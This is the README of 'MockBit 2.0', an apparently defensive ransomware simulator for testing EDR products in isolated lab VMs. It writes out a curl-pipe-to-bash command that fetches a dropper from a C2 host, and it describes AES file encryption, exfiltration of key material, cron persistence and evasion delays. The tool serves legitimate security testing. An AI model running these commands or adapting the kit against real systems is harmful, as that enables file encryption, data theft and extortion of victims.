# MockBit 2.0

**Safe ransomware simulation for EDR validation**

> ⚠️ **Read first:** MockBit is a controlled, fully reversible lab tool. Use it *only* in isolated VMs or air‑gapped networks that you own. Never deploy it on production, shared, or third-party systems.

---

## Table of contents

1. [Overview](#overview)
2. [Quick start (5 minutes)](#quick-start-5-minutes)
3. [Repository structure](#repository-structure)
4. [Manual usage](#manual-usage)
5. [Customization tips](#customization-tips)
6. [Troubleshooting](#troubleshooting)
7. [License & contributions](#license--contributions)
8. [MITRE ATT&CK mapping](#mitre-attck-mapping)

---

## Overview

MockBit behaves like real ransomware (ATT&CK T1486) while keeping you in full control:

| Stage        | Realism                         | Safety net                               |
|--------------|---------------------------------|-------------------------------------------|
| Delivery     | `curl` / `wget` payload         | No exploits, no privilege escalation      |
| Encryption   | AES-256-CBC via OpenSSL         | Key logged → 100 % decryptable            |
| Exfiltration | File list + key fragment        | Only dummy data you create                |
| Persistence  | Optional cron job               | One-liner removal included                |
| Cleanup      | —                               | Built-in decryptor and uninstaller        |

---

## Quick start (5 minutes)

**Lab topology**

```
    +-----------+      +---------------+
    | Attacker  |----->| Victim VM     |
    | (C2 host) |      | (SentinelOne) |
    +-----------+      +---------------+
```

**One-command install (attacker – AlmaLinux 8.10)**

```bash
sudo dnf install -y git python3-pip openssl
git clone https://github.com/Deathcrusher/mockbit_2.0.git
cd mockbit_2.0
chmod +x setup.sh && sudo ./setup.sh
```

**Example output**

```
C2 ready: http://192.168.1.100:8080
Payload URL: http://192.168.1.100:8000/payload_downloader.sh
Test files: /tmp/test_victim (200 items)
```

**Trigger on victim (non-root for maximum EDR visibility)**

```bash
curl -s http://192.168.1.100:8000/payload_downloader.sh | bash
```

Watch SentinelOne raise alerts, then decrypt when the run completes.

---

## Repository structure

```
mockbit_2.0/
├── setup.sh              # Installer & test-file generator
├── c2_server.py          # Flask C2 (beacon, exfil, key log)
├── payload_downloader.sh # Stage-0 dropper
├── ransomware.sh         # Stage-1 encryptor
├── decryptor.sh          # Stage-2 recovery
└── README.md             # This guide
```

> **Note:** `ransomware.sh` replaces the legacy `ransomware_core.sh` referenced in older docs.

---

## Manual usage

Skip `setup.sh` if you prefer to run individual stages.

```bash
# Encrypt only
./ransomware.sh /target/dir http://c2:8080

# Decrypt only
./decryptor.sh /target/dir "KEY" "IV"

# Stop the C2 server
pkill -f c2_server.py

# (Optional) clean up lab artefacts manually
#   - Remove generated cron jobs
#   - Delete /tmp/test_victim or other test directories
```

---

## Customization tips

- **Target directory:** edit the `TARGET_DIR` variable in the shell scripts.
- **Cipher suite:** change the `openssl enc -aes-256-*` invocation.
- **Evasion delays:** insert `sleep $((RANDOM % 10))` or similar pauses.
- **Parallelization:** leverage `xargs -P 8 -I {} …` for multi-threaded encryption.
- **C2 endpoint:** update the `C2_URL` variable to your desired host.

---

## Troubleshooting

| Issue                | Resolution |
|----------------------|------------|
| Port 8080 blocked    | `sudo firewall-cmd --add-port=8080/tcp --permanent && sudo firewall-cmd --reload` |
| No SentinelOne alert | Run as **non-root** and ensure “Deep Visibility” + “Ransomware” policies are enabled. |
| Decrypt fails        | Use the key and IV from the **same run** (check the C2 `/exfil` endpoint or ransom note). |
| Python missing       | `sudo dnf install python3 python3-pip && pip3 install flask` |

---

## License & contributions

- MIT License © 2025 Deathcrusher
- Pull requests welcome (e.g., Windows port, additional TTPs, educational EDR bypass research)

---

## MITRE ATT&CK mapping

- **T1566.002 – Initial Access:** `curl` / `wget` payload delivery
- **T1059.004 – Execution:** Unix shell
- **T1053.003 – Persistence:** Optional cron job
- **T1041 – Exfiltration:** HTTP POST to the C2 server
- **T1486 – Impact:** Data encrypted for impact
